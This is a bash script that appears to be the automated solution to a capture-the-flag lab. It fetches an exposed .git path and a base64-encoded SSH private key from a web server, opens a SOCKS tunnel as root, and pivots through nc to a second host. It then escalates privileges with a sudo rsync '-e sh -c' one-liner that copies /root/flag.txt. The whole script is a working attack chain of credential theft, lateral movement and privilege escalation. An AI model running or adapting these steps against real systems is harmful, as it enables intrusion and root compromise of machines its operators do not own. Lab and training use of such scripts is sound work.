#!/bin/bash

# Kills process that has local port 5000 open 
kill $(lsof -t -i:5000) 2>/dev/null

# First step - Retrieving data and decoding key
echo "[*] First step - Retrieving data and decoding key"
echo "$(curl -sk https://172.18.0.2/.git)"
echo "$(curl -sk https://172.18.0.2/rsa)" | base64 -d > solution/access_key

chmod 600 solution/access_key

# Second step - Pivoting to access the backups machine
echo "[*] Second step - Pivoting to access the backups machine"
ssh -i solution/access_key \
    -D 5000 \
    -N -f \
    -o StrictHostKeyChecking=no \
    root@172.18.0.2

sleep 1   # wait for tunnel

# Third step - Retrieving file
echo "[*] Third step - Retrieving file"
ssh -i solution/access_key \
    -o "ProxyCommand=nc -X 5 -x localhost:5000 %h %p" \
    -o StrictHostKeyChecking=no \
    ubuntu@192.168.10.3 \
    "cat ~/flag.txt"

# Fourth step - Privilege escalation and flag retrieval
echo "[*] Fourth step - Privilege escalation and flag retrieval"
ssh -i solution/access_key \
    -o "ProxyCommand=nc -X 5 -x localhost:5000 %h %p" \
    -o StrictHostKeyChecking=no \
    ubuntu@192.168.10.3 \
    'sudo rsync -e "sh -c \"cp /root/flag.txt /tmp/f && chmod 777 /tmp/f\"" x:x /dev/null 2>/dev/null; cat /tmp/f'